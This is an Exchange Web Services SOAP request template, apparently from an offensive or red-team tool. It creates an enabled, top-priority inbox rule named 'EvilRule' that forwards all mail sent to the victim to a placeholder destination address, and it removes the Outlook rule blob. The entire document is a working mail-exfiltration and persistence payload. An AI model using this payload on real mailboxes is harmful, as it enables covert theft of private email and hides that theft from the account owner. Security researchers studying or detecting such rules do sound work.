<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="${ExchangeVersion}" />
  </soap:Header>
  <soap:Body>
    <m:UpdateInboxRules>
      <m:RemoveOutlookRuleBlob>true</m:RemoveOutlookRuleBlob>
      <m:Operations>
        <t:CreateRuleOperation>
          <t:Rule>
            <t:DisplayName>EvilRule</t:DisplayName>
            <t:Priority>1</t:Priority>
            <t:IsEnabled>true</t:IsEnabled>
            <t:Conditions>
              <t:SentToMe>true</t:SentToMe>
            </t:Conditions>
            <t:Exceptions />
            <t:Actions>
              <t:ForwardToRecipients>
                <t:Address>
					<t:Name>${DestAddress}</t:Name>
					<t:EmailAddress>${DestAddress}</t:EmailAddress>
					<t:RoutingType>SMTP</t:RoutingType>
				</t:Address>
              </t:ForwardToRecipients>
            </t:Actions>
          </t:Rule>
        </t:CreateRuleOperation>
      </m:Operations>
    </m:UpdateInboxRules>
  </soap:Body>
</soap:Envelope>
